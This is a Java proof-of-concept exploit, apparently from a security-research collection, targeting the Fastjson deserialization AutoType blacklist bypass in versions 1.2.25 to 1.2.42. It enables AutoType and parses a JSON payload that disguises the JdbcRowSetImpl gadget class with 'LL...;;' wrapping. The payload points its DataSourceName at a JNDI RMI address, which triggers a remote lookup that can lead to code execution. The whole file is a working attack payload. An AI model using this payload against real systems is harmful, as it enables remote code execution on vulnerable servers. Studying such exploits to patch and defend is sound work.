package com.yyjccc.fastjson.exp.bypass.autotype;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * 条件：需要开启AutoType
 * jdk: 8
 * 版本：1.2.25 <= fastjson <= 1.2.42
 */
public class fastjson1242 {
	public static void main(String[] args) {
		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
		JSON.parse(payload());
	}

	public static String payload(){

		String jndiAddress="rmi://127.0.0.1:8085/ngmjzGDj";
		String data="{\n\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\n\"DataSourceName\":\""+jndiAddress+"\",\n\"AutoCommit\":false\n}";
		System.out.println(data);
		return data;
	}
}
